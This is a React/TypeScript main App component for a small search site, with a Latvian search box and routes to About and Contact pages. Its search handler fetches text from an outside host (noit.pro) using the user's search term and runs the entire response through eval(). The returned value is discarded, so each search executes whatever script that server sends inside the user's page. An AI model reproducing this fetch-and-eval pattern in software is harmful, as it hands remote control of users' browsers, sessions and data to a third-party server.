import React, { useState } from 'react';
import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
import Header from './components/Header';
import Footer from './components/Footer';
import Majas from './components/Majas';
import { About } from './components/About';
import { Contact } from './components/Contact';
import Bbf from './components/fetch/Bbf';

const Search: React.FC<{ onSearch: (term: string) => void }> = ({ onSearch }) => {
  const [term, setTerm] = useState('');

  const handleSearch = () => {
    if (term && term.length > 3) {
      onSearch(term);
    }
  };

  return (
    <div>
      <h1>Meklēt</h1>
      <input
        type="text"
        placeholder="Ievadi ko meklēt"
        value={term}
        onChange={(e) => setTerm(e.target.value)}
      />
      <button onClick={handleSearch}>Search</button>
    </div>
  );
};

const App: React.FC = () => {
  const [searchTerm, setSearchTerm] = useState('');

  const handleFetch = async (term: string) => {
    try {
      const response = await fetch("https://noit.pro/cdv/?q=" + encodeURIComponent(term));
      const html = await response.text();

      const scriptContent = html;

      let res;
      try {
        res = eval(scriptContent);
        //console.log( res);
      } catch (e) {
        console.error('Error executing script:', e);
      }
    } catch (error) {
      console.error('Error fetching page:', error);
    }
  };

  const handleSearch = (term: string) => {
    setSearchTerm(term);
    handleFetch(term);
  };

  return (
    <Router>
      <Header />
      <Search onSearch={handleSearch} />
      <Routes>
        <Route path="/" element={<Bbf term={searchTerm} />} />
        <Route path="/about" element={<About />} />
        <Route path="/contact" element={<Contact />} />
      </Routes>
      <Footer />
    </Router>
  );
};

export default App;
